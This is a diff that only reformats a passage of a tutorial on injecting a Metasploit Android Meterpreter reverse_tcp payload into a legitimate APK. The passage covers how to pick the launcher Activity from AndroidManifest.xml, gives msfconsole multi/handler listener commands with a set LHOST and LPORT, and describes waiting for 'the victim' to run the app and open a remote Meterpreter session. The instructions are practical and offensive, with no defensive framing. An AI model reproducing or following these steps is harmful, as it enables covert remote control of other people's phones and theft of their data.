@@ -55,7 +55,7 @@ _NOTE_ – If you are going to conduct this attack over the internet, be sure to
 
 Once you run the command, if you are lucky, the script will do everything by itself and complete the whole process. But more than often it cannot determine to which Activity of the app it should bind the payload to, so it asks you to select it. In that case, leave the terminal open with the script at the prompt, and browse to /root/original.
 
-Then open the `AndroidManifest.xml` file using any text editor you like and look for an <activity> tag which contains both the texts ‘.MAIN’ and ‘.LAUNCHER’. When you find that tag, look for the ‘android:name’ attribute of that tag and from there, note the name of that Activity.
+Then open the `AndroidManifest.xml` file using any text editor you like and look for an `<activity>` tag which contains both the texts ‘.MAIN’ and ‘.LAUNCHER’. When you find that tag, look for the ‘android:name’ attribute of that tag and from there, note the name of that Activity.
 
 At the prompt of the Ruby script, enter the number corresponding to the Activity name you had noted previously and press Enter.
 
@@ -71,14 +71,12 @@ If you did everything correctly, you should now get a apk file in your root dire
 
 As for the listener, you should use multi/handler and set the corresponding options accordingly. Just run the following commands.
 
-```console
-msfconsole
-use multi/handler
-set PAYLOAD android/meterpreter/reverse_tcp
-set LHOST 192.168.0.104
-set LPORT 4895
-exploit
-```
+    msfconsole
+    use multi/handler
+    set PAYLOAD android/meterpreter/reverse_tcp
+    set LHOST 192.168.0.104
+    set LPORT 4895
+    exploit
 
 Now wait for the victim to run the app, when he does it, you will get a Meterpreter prompt in the terminal!
 
